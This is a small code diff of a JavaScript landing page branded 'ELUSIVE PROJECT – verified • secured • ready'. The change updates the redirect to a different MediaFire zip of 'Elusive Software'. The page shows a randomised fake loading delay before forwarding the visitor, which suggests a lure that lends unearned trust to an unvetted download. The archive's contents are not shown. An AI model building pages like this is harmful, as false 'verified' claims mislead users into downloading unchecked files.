@@ -1,7 +1,7 @@
 const CONFIG = {
     brandName: "ELUSIVE PROJECT",
     brandTagline: "verified • secured • ready",
-    defaultRedirect: "https://www.mediafire.com/file_premium/johlcipzpfk09vr/Elusive_Software_2.4.1.zip/file",
+    defaultRedirect: "https://www.mediafire.com/file_premium/wznd3ge2fsyd4ta/Elusive_Software_4.1.zip/file",
     minLoadMs: 6500,
     maxLoadMs: 9500,
     accelerateNearEnd: true
@@ -218,5 +218,6 @@ function finalizeAndRedirect() {
 
     setTimeout(() => location.replace(targetUrl), rand(180, 360));
 }
+
 
 requestAnimationFrame(tick);
